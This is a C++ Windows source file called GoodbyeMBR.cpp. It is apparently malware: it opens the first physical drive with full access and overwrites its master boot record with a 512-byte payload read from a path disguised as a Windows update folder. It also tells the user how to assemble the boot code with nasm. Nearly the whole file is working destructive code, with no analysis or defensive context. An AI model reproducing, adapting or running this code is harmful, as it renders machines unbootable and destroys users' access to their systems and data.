// GoodbyeMBR.cpp : This file contains the 'main' function. Program execution begins and ends there.
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <iostream>
#include <Windows.h>

int main()
{
    // Overwrite
    HANDLE drive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    if (drive == INVALID_HANDLE_VALUE) { printf("Error opening a handle to the drive."); return -1; }

    HANDLE binary = CreateFileW(L"C:\\Windows\\SystemUpdateResources\\boot.bin", GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
    if (binary == INVALID_HANDLE_VALUE) { printf("Error opening a handle to boot.bin"); return -1; }

    DWORD size = GetFileSize(binary, 0);
    if (size != 512) { printf("Error opening a handle to boot.bin"); return -1; }

    byte* new_mbr = new byte[size];
    DWORD bytes_read;
    if (ReadFile(binary, new_mbr, size, &bytes_read, 0))
    {
        if (WriteFile(drive, new_mbr, size, &bytes_read, 0))
        {
            printf("First sector overritten successfully!\n");
        }
    }
    else
    {
        printf("Error reading boot.bin\n");
        printf("Make sure to compile the ASM file with 'nasm -f bin -o boot.bin boot.asm'");
    }

    CloseHandle(binary);
    CloseHandle(drive);
    return 0;
}